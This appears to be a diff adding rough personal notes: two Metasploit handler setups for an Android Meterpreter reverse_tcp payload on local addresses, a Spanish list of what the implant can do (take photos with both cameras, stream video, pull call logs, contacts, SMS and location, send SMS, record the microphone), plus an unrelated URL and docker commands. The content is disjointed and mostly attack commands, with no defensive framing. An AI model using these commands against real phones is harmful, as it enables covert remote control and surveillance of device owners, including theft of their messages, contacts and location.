@@ -1,0 +1,28 @@
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.1.77
+set LPORT 1234
+exploit
+
+
+Tomar Fotos con ambas cámaras (Frontal y Trasera)
+Hacer Streming desde la cámara seleccionada
+Verificar si el dispositivo es ROOTEADO
+Obtiene el listado de llamadas
+Lista Contactos
+Obtiene  SMS
+Consigue la Ubicación del Dispositivo
+Envia SMS
+Grabar a través del Micrófono
+
+monaco
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.0.32
+set LPORT 1234
+exploit
+
+https://qiita.com/bmj0114/items/3d8fa2a5dc369c3271f9
+
+[root@sunny ~]# docker cp ./test.jar 6c5fbb0f16c3:/home/test.jar
+root@6c5fbb0f16c3:/# java -jar /home/test.jar
